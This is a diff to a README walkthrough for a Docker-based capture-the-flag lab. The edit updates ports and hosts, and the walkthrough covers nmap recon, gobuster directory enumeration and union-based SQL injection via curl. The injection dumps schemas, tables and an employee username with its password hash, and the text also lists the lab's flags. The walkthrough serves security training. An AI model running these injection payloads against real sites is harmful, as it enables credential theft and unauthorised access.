@@ -8,8 +8,9 @@ Four-flag CTF lab covering: recon → directory enumeration → union-based SQL 
 docker compose up --build
 ```
 
-- Web: `http://localhost:8081`
-- SSH: `localhost:22`
+- Web: `http://<TARGET>:8081`
+- CTF SSH (john): `<TARGET>:22`
+- Host SSH (admin): `<TARGET>:2222`
 
 ## Flags
 
@@ -43,16 +44,17 @@ docker compose up --build
 Scan the target to discover running services:
 
 ```bash
-nmap -sV <TARGET>
+nmap -sV -Pn <TARGET>
 ```
 
 Expected output:
 ```
-22/tcp  open  ssh     OpenSSH 8.9
-80/tcp  open  http    Apache httpd 2.4
+22/tcp    open  ssh     OpenSSH 8.9
+2222/tcp  open  ssh     OpenSSH 9.6  (host — not the target)
+8081/tcp  open  http    Apache httpd 2.4
 ```
 
-Visit `http://<TARGET>` — looks like a company homepage with nothing interesting.
+Visit `http://<TARGET>:8081` — looks like a company homepage with nothing interesting.
 
 ---
 
@@ -61,7 +63,7 @@ Visit `http://<TARGET>` — looks like a company homepage with nothing interesti
 Use gobuster with a large wordlist to discover hidden directories:
 
 ```bash
-gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/big.txt -x php
+gobuster dir -u http://<TARGET>:8081 -w /usr/share/wordlists/dirb/big.txt -x php
 ```
 
 Expected output:
@@ -70,7 +72,7 @@ Expected output:
 /search/index.php     (Status: 200)
 ```
 
-Visit `http://<TARGET>/search` — an internal employee lookup portal.
+Visit `http://<TARGET>:8081/search` — an internal employee lookup portal.
 
 **Flag 1: `SMC{P4TH_FINDER}`** is displayed on the page. ✓
 
@@ -83,7 +85,7 @@ The portal has an `id` parameter: `/search/index.php?id=1`
 **Probe the query:** try breaking it first:
 
 ```
-/search/index.php?id=1'
+http://<TARGET>:8081/search/index.php?id=1'
 ```
 
 If output disappears or you see an error, the parameter is injectable.
@@ -91,7 +93,7 @@ If output disappears or you see an error, the parameter is injectable.
 **Determine column count:** the original query returns 2 columns (name, department):
 
 ```bash
-curl "http://<TARGET>/search/index.php?id=0 UNION SELECT 1,2--"
+curl "http://<TARGET>:8081/search/index.php?id=0 UNION SELECT 1,2--"
 ```
 
 Returns: `1 | 2` — confirms 2-column output.
@@ -100,7 +102,7 @@ Returns: `1 | 2` — confirms 2-column output.
 
 ```bash
 # List all schemas
-curl "http://<TARGET>/search/index.php?id=0 UNION SELECT schema_name,1 FROM information_schema.schemata--"
+curl "http://<TARGET>:8081/search/index.php?id=0 UNION SELECT schema_name,1 FROM information_schema.schemata--"
 ```
 
 Returns:
@@ -114,7 +116,7 @@ information_schema | 1
 
 ```bash
 # List tables in public schema
-curl "http://<TARGET>/search/index.php?id=0 UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema='public'--"
+curl "http://<TARGET>:8081/search/index.php?id=0 UNION SELECT table_name,table_schema FROM information_schema.tables WHERE table_schema='public'--"
 ```
 
 Returns:
@@ -126,7 +128,7 @@ employees | public
 
 ```bash
 # List columns in employees table
-curl "http://<TARGET>/search/index.php?id=0 UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='employees'--"
+curl "http://<TARGET>:8081/search/index.php?id=0 UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='employees'--"
 ```
 
 Returns:
@@ -141,7 +143,7 @@ department | text
 Now you know the column names. **Extract credentials:**
 
 ```bash
-curl "http://<TARGET>/search/index.php?id=0 UNION SELECT username,password FROM employees--"
+curl "http://<TARGET>:8081/search/index.php?id=0 UNION SELECT username,password FROM employees--"
 ```
 
 Returns:
@@ -255,8 +257,8 @@ cat /root/.flag.txt
 
 | Step | Command | Result |
 |------|---------|--------|
-| Port scan | `nmap -sV <TARGET>` | SSH + HTTP discovered |
-| Dir enum | `gobuster dir ... -x php` | `/search` found |
+| Port scan | `nmap -sV -Pn <TARGET>` | SSH:22, HTTP:8081 discovered |
+| Dir enum | `gobuster dir -u http://<TARGET>:8081 ... -x php` | `/search` found |
 | SQLi enum | `?id=0 UNION SELECT table_name,1 FROM information_schema.tables WHERE table_schema='public'--` | tables revealed |
 | SQLi enum | `?id=0 UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name='employees'--` | columns revealed |
 | SQLi dump | `?id=0 UNION SELECT username,password FROM employees--` | `john:0571749e2ac330a7455809c6b0e7af90` |
